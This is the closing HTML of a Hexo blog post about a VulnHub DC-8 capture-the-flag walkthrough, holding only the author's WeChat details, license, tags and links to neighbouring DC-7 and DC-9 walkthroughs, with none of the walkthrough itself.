+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/09/Vulnhub-DC-8/">http://example.com/2020/03/09/Vulnhub-DC-8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/09/Vulnhub-DC-9/">VulnHub通关日记-DC_9-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/09/Vulnhub-DC-7/">VulnHub通关日记-DC_7-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
